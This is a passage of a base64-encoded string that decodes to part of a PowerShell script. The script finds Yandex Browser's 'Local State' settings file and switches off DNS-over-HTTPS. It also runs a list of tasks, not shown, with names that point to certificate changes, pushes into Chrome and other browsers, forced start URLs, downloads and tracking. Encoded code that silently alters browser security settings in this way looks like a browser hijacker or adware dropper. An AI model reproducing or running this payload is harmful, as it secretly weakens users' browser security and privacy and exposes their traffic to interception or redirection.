NoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkcGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyIC1DaGlsZFBhdGggJ1lhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZScNCg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkcGF0aCAtUGF0aFR5cGUgTGVhZikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBDb25maWd1cmVZYW5kZXhJbnRlcm5hbCAtRmlsZVBhdGggJHBhdGgNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3Igb2NjdXJyZWQ6ICRfIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVZYW5kZXhJbnRlcm5hbCB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJGZpbGVQYXRoDQogICAgKQ0KICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCiAgICBpZiAoJG51bGwgLWVxICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1vciAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtaXNub3QgW29iamVjdF0pIHsNCiAgICAgICAgJGNvbnRlbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnZG5zX292ZXJfaHR0cHMnIC1WYWx1ZSBAew0KICAgICAgICAgICAgJ21vZGUnID0gJ29mZicNCiAgICAgICAgICAgICd0ZW1wbGF0ZXMnID0gIiINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLm1vZGUgPSAnb2ZmJw0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy50ZW1wbGF0ZXMgPSAiIg0KICAgIH0NCg0KICAgICRqc29uU3RyaW5nID0gJGNvbnRlbnQgfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMTANCg0KICAgIFNldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtVmFsdWUgJGpzb25TdHJpbmcgLUVuY29kaW5nIFVURjggLUZvcmNlDQoNCiAgICB3cml0ZWRiZyAiU3VjY2Vzc2Z1bGx5IGNvbmZpZ3VyZWQgWWFuZGV4IHNldHRpbmdzIGluICRmaWxlUGF0aCINCn0NCg0KIyMjaGVhZA0KDQoNCg0KZnVuY3Rpb24gSW52b2tlLVNjcmlwdA0Kew0KICAgIHBhcmFtDQogICAgKA0KICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICAgICAgW3N0cmluZ10NCiAgICAgICAgJHNjcmlwdFBhdGgsDQoNCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldDQogICAgICAgIFtzdHJpbmdbXV0NCiAgICAgICAgJHRhc2tOYW1lDQogICAgKQ0KICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIE5vcm1hbCAtQXJndW1lbnRMaXN0ICItZmlsZSAiIiRzY3JpcHRQYXRoIiIgLVRhc2sgJHRhc2tOYW1lIg0KfQ0KDQokZ2xvYmFsOlRhc2sgPSAkbnVsbA0KDQpmb3IgKCRpID0gMDsgJGkgLWx0ICRhcmdzLkNvdW50OyAkaSsrKSB7DQogICAgaWYgKCRhcmdzWyRpXSAtZXEgJy1UYXNrJykgew0KICAgICAgICBpZiAoJGkgKyAxIC1sdCAkYXJncy5Db3VudCkgew0KICAgICAgICAgICAgJGdsb2JhbDpUYXNrID0gJGFyZ3NbJGkgKyAxXQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgd3JpdGVkYmcgIk5vIHZhbHVlIHByb3ZpZGVkIGZvciAtVGFzayBhcmd1bWVudC4iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIE1haW4gDQp7DQogICAgJHNjcmlwdFBhdGggPSBHZXQtU2NyaXB0UGF0aA0KICAgIHdyaXRlZGJnICJwcm9ncmFtIGN1clNjcmlwdDogJHNjcmlwdFBhdGgiDQoNCiAgICBpZiAoJGdsb2JhbDpUYXNrKSB7DQogICAgICAgIHdyaXRlZGJnICJUYXNrIC0gJHRhc2siDQogICAgICAgICYgJGdsb2JhbDpUYXNrDQogICAgfSBlbHNlIHsgICAgICAgICAgICAgICANCg0KICAgICAgICAkdGFza0Z1bmN0aW9ucyA9IEAoDQogICAgICAgICAgICAnZG9fZG5zbWFuJywnZG9fY2VydCcsJ2RvX2Nocm9tZScsJ2RvX2Nocm9tZV9wdXNoJywnZG9fY2hyb21lX3VibG9jaycsJ2RvX2VkZ2UnLCdkb19lbWJlZGRpbmdzJywnZG9fZmlyZWZveCcsJ2RvX29wZXJhJywnZG9fc3RhcnRkb3dubG9hZHMnLCdkb19zdGFydHVybHMnLCdkb190cmFja2VyJywnZG9feWFuZGV4JywnZG9fZXh0cmF1cGRhdGUnDQogICAgICAgICkNCg0KICAgICAgICB3cml0ZWRiZyAiTWFpbiAtICINCiAgICAgICAgZm9yZWFjaCAoJHRhc2sgaW4gJHRhc2tGdW5jdGlvbnMpIHsNCg0KICAgICAgICAgICAgaWYgKCR0YXNrIC1lcSAiZG9faG9sZGVyIikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB3cml0ZWRiZyAiTWFpbi1Ib2xkZXIgLSAkdGFzayINCiAgICAgICAgICAgICAgICA8IyM+IGRvX2hvbGRlcg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHdyaXRlZGJnICJNYWluIC0gJHRhc2siDQogICAgICAgICAgICAgICAgSW52b2tlLVNjcmlwdCAkc2NyaXB0UGF0aCAkdGFzaw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpNYWlu"
